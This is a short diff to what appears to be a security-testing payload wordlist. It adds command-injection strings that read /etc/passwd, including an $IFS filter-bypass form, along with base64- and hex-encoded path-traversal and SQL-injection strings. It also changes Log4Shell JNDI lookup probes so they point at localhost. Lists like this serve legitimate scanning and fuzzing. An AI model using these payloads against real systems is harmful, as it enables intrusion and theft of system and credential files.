@@ -879,8 +879,11 @@ $(sleep 9)
 _
 `
 `dir`
+`cat /etc/passwd`
 `or`1`=`
 `or``=`
+|cat /etc/passwd
+|cat$IFS/etc/passwd
 abc' or name(//users/LoginID[1]) = 'LoginID' or 'a'='b
 c
 cn
@@ -930,5 +933,17 @@ x\\|
 %27%22%25%32%37%25%32%32
 {{1330+7}}
 ${jndi:ldap://127.0.0.1}
-$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D
+$%7Bjndi:dns://127.0.0.1/%7D
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1}
+J29yJyc9Jw==
+276f7227273d27
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6574632f706173737764
+L2V0Yy9wYXNzd2Q=
+2f6574632f706173737764
+Li5cLi5cLi5cLi5cLi5cLi5cLi5cYm9vdC5pbmk=
+2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c2e2e5c626f6f742e696e69
+O2NhdCAvZXRjL3Bhc3N3ZA==
+3b636174202f6574632f706173737764
+ZWNobyAiMTMzNyI=
+6563686f20223133333722
